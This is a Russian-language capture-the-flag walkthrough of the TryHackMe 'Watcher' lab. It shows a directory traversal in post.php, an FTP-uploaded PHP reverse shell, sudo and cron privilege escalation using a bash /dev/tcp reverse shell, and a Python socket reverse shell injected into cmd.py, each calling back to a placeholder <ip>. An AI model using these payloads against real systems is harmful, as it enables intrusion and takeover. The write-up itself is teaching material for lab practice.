# Watcher

## Enumeration
Сканируем ip командами:
```
nmap -sC -sV watcher.thm
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                    
```

Пробрутим сайт на наличие каких-либо файлов.
```
gobuster dir -u http://watcher.thm/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.txt,.php
```

```
/post.php             (Status: 200) [Size: 2422]
/index.php            (Status: 200) [Size: 4826]
/css                  (Status: 301) [Size: 308] [--> http://watcher.thm/css/]
/images               (Status: 301) [Size: 311] [--> http://watcher.thm/images/]
/robots.txt           (Status: 200) [Size: 69]
/round.php            (Status: 200) [Size: 3440]
/bunch.php            (Status: 200) [Size: 3445]
```

В файле robots.txt можно обнаружить следующие файлы:
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

Перейдем к самому сайту. Главная страница выглядит следующим образом:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/1.png)

Перейдем по любой картинке. URL выгляит следующим образом:
```
http://watcher.thm/post.php?post=round.php
```

Попробуем экплуатироать directory traversal. Для этого попробуем прочитать файл /etc/passwd.
```
http://watcher.thm/post.php?post=../../../etc/passwd
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/2.png)

Таким же образом можем прочесть второй файл, который мы нашли в robots.txt, т.к. раньше мы не имели к нему доступа.
```
http://watcher.thm/post.php?post=secret_file_do_not_read.txt
```

В нем мы находим следующий текст и данные пользователя для доступа к ftp.
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:<password>
```

Подключаемся с имеющимися данными по ftp. Находим второй флаг, а также директорию files. Попробуем загрузить в эту директорию php-reverse-shell.
```
cd files

put php_reverse-shell.php
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/3.png)

Запускаем слушатель на установленном порту и отрываем shell через браузер.
```
http://watcher.thm/post.php?post=/home/ftpuser/ftp/files/php_reverse_shell.php
```

Получаем оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/4.png)

Используем команду find, чтобы найти расположение всех флагов на машине.
```
find / -type f -name "flag*.txt" 2>/dev/null
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/5.png)

Забираем третий флаг. Просмотрим имеющиеся права командой sudo -l.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/6.png)

Мы моем выполнять любые команды от имени пользователя toby. Запустим bash от этого пользователя.
```
sudo -u toby /bin/bash
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/7.png)

Забираем четвертый флаг. Просмотрев файлы в домашней директории пользователя toby, можно найти файл note.txt.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/8.png)

В ней сказано, что пользователь Mat настроил задачи cron. Прочтем эти задачи.
```
cat /etc/crontab
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/9.png)

От люча имени пользователя mat исполняется файл cow.sh. Посмотрим что находится в файле.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/10.png)

Впишем в этот файл команду для создания обратной оболочки.
```
sh -i >& /dev/tcp/<ip>/<port> 0>&1
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/11.png)

Запускаем слушател на нужном порту и ждем соединения.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/12.png)

Забираем пятый флаг. Просмотрев файлы в домашней директории пользователя mat, можно найти файл note.txt.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/13.png)

В записке сказано, что пользователь Will предоставил права на выполнение какого-то скрипта. Просмотрим имеющиеся права командой sudo -l.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/14.png)

Перейдем в папку scripts. В ней находятся два скрипта will_script.py и cmd.py.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/15.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/16.png)

Передав значение в скрипт will_script, он передает его в скрипт cmd.py и тот в свою очередь проверяет его и исполняет команду. Добавим код в cmd.py для получения обратной оболочки.
```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ip>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/17.png)

Запускаем слушатель и вводим следующую команду для выполненния скрипта от имени пользователя will. Получаем оболочку. Забираем шестой флаг.
```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/18.png)

Просмотрев различные директории можно найти файл key.b64.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/19.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/20.png)

Попробуем закинуть содержимое файла в CyberChef и декодировать из base64. Получаем ключ RSA. Сохраним его в файл, дадим ему права 600 и подключимся по ssh.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Watcher/21.png)

Получаем последний флаг.
